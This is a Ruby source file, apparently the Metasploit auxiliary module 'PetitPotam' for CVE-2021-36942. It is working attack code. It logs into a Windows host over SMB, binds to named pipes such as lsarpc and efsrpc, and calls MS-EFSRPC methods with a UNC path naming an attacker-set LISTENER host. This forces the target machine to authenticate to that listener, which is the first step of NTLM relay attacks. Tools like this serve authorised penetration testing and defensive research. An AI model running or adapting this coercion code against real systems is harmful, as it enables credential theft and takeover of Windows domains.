##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'windows_error'
require 'ruby_smb'
require 'ruby_smb/error'
require 'ruby_smb/dcerpc/encrypting_file_system'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::DCERPC
  include Msf::Exploit::Remote::SMB::Client::Authenticated
  include Msf::Auxiliary::Scanner

  EncryptingFileSystem = RubySMB::Dcerpc::EncryptingFileSystem

  METHODS = %w[EfsRpcOpenFileRaw EfsRpcEncryptFileSrv EfsRpcDecryptFileSrv EfsRpcQueryUsersOnFile EfsRpcQueryRecoveryAgents].freeze
  PIPE_HANDLES = {
    lsarpc: {
      uuid: EncryptingFileSystem::LSARPC_UUID,
      opts: ['\\lsarpc'.freeze]
    },
    efsrpc: {
      uuid: EncryptingFileSystem::EFSRPC_UUID,
      opts: ['\\efsrpc'.freeze]
    },
    samr: {
      uuid: EncryptingFileSystem::LSARPC_UUID,
      opts: ['\\samr'.freeze]
    },
    lsass: {
      uuid: EncryptingFileSystem::LSARPC_UUID,
      opts: ['\\lsass'.freeze]
    },
    netlogon: {
      uuid: EncryptingFileSystem::LSARPC_UUID,
      opts: ['\\netlogon'.freeze]
    }
  }.freeze

  def initialize
    super(
      'Name' => 'PetitPotam',
      'Description' => %q{
        Coerce an authentication attempt over SMB to other machines via MS-EFSRPC methods.
      },
      'Author' => [
        'GILLES Lionel',
        'Spencer McIntyre'
      ],
      'References' => [
        [ 'CVE', '2021-36942' ],
        [ 'URL', 'https://github.com/topotam/PetitPotam' ],
        [ 'URL', 'https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-efsr/403c7ae0-1a3a-4e96-8efc-54e79a2cc451' ]
      ],
      'License' => MSF_LICENSE
    )

    register_options(
      [
        OptString.new('LISTENER', [ true, 'The host listening for the incoming connection', Rex::Socket.source_address ]),
        OptEnum.new('PIPE', [ true, 'The named pipe to use for triggering', 'lsarpc', PIPE_HANDLES.keys.map(&:to_s) ]),
        OptEnum.new('METHOD', [ true, 'The RPC method to use for triggering', 'Automatic', ['Automatic'] + METHODS ])
      ]
    )
  end

  def run_host(_ip)
    begin
      connect
    rescue Rex::ConnectionError => e
      fail_with(Failure::Unreachable, e.message)
    end

    begin
      smb_login
    rescue Rex::Proto::SMB::Exceptions::Error, RubySMB::Error::RubySMBError => e
      fail_with(Failure::NoAccess, "Unable to authenticate ([#{e.class}] #{e}).")
    end

    handle_args = PIPE_HANDLES[datastore['PIPE'].to_sym]
    fail_with(Failure::BadConfig, "Invalid pipe: #{datastore['PIPE']}") unless handle_args

    @handle = dcerpc_handle(
      handle_args[:uuid],
      handle_args.fetch(:version, '1.0'),
      handle_args.fetch(:protocol, 'ncacn_np'),
      handle_args[:opts]
    )
    vprint_status("Binding to #{@handle} ...")
    dcerpc_bind(@handle)
    vprint_status("Bound to #{@handle} ...")

    if datastore['METHOD'] == 'Automatic'
      methods = METHODS
    else
      methods = [datastore['METHOD']]
    end

    methods.each do |method|
      vprint_status("Attempting to coerce authentication via #{method}")
      response = efs_call(
        method,
        file_name: "\\\\#{datastore['LISTENER']}\\#{Rex::Text.rand_text_alphanumeric(4..8)}\\#{Rex::Text.rand_text_alphanumeric(4..8)}.#{Rex::Text.rand_text_alphanumeric(3)}"
      )
      if response.nil?
        unless method == methods.last
          # rebind if we got a DCERPC error (as indicated by no response) and there are more methods to try
          vprint_status("Rebinding to #{@handle} ...")
          dcerpc_bind(@handle)
        end

        next
      end

      error_status = response.error_status.to_i
      win32_error = ::WindowsError::Win32.find_by_retval(error_status).first
      case win32_error
      when ::WindowsError::Win32::ERROR_BAD_NETPATH
        # this should be the response even if LISTENER was inaccessible
        print_good('Server responded with ERROR_BAD_NETPATH which indicates that the attack was successful')
        break
      when nil
        print_status("Server responded with unknown error: 0x#{error_status.to_s(16).rjust(8, '0')}")
      else
        print_status("Server responded with #{win32_error.name} (#{win32_error.description})")
      end
    end
  end

  def efs_call(name, **kwargs)
    request = EncryptingFileSystem.const_get("#{name}Request").new(**kwargs)

    begin
      raw_response = dcerpc.call(request.opnum, request.to_binary_s)
    rescue Rex::Proto::DCERPC::Exceptions::Fault => e
      print_error "The #{name} Encrypting File System RPC request failed (#{e.message})."
      return nil
    end

    EncryptingFileSystem.const_get("#{name}Response").read(raw_response)
  end
end
